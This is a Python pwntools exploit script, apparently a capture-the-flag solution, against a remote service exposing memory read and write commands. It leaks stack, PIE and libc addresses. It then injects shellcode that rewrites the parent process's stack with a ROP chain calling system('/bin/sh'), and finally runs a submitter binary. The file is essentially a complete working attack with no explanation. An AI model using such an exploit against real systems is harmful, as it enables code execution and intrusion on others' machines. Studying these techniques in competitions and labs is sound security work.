#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.log_level = "debug"

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

r = remote(HOST, int(PORT))


def read(addr):
    r.sendlineafter(b"Choice: ", b"1")
    r.sendlineafter(b"Address: ", hex(addr).encode())
    r.recvuntil(b"Value: ")
    return int(r.recvline().strip(), 16)


def write(addr, value):
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"Value: ", hex(value).encode())
    r.sendlineafter(b"Address: ", hex(addr).encode())


def boom():
    r.sendlineafter(b"Choice: ", b"3")


stack_ptr = read(0)
print(f"stack_ptr: {hex(stack_ptr)}")
for i in range(0, 0x1000, 8):
    z = read(stack_ptr + i)
    if z & 0xFFF == 0x260 and z < 0x7F0000000000:
        pie_base = z - 0x1260
        break
else:
    print("pie_base not found")
    exit(1)

print(f"pie_base: {hex(pie_base)}")

libc_base = read(pie_base + 0x34D8) - 0x80E50
print(f"libc_base: {hex(libc_base)}")
writev_helper = pie_base + 0x14FC

buffer = libc_base + 2205024
system = libc_base + 0x50D70
pop_rdi_ret = libc_base + 0x000000000002A3E5


def wc(addr, value):
    return f"""
movabs rdi, {addr}
movabs rsi, {value}
call pvmw
"""


dang = u64(b"/bin/sh\x00")

payload = asm(
    f"""
    mov rax, SYS_getppid
    syscall
    mov r15, rax

    pop rbx

    {wc(buffer, dang)}

    lea rdi, [rsp]
    movabs rsi, {pop_rdi_ret + 1}
    call pvmw
    
    lea rdi, [rsp + 8]
    movabs rsi, {pop_rdi_ret}
    call pvmw

    lea rdi, [rsp + 16]
    movabs rsi, {buffer}
    call pvmw

    lea rdi, [rsp + 24]
    movabs rsi, {system}
    call pvmw
    ud2

pvmw:
    mov rdx, rsi
    mov rsi, rdi
    mov rdi, r15
    movabs rax, {writev_helper}
    call rax
    ret
"""
)
while len(payload) % 8:
    payload += b"\x90"


base = pie_base + 0x1000
for i in range(0, len(payload), 8):
    write(base + i, u64(payload[i : i + 8]))

bruh = asm(f"movabs rax, {base}; jmp rax").ljust(16, b"\x90")
write(pie_base + 0x148C, u64(bruh[8:]))
write(pie_base + 0x1484, u64(bruh[:8]))

time.sleep(2)

boom()

r.sendline(b"./submitter; exit")
print(r.recvall())
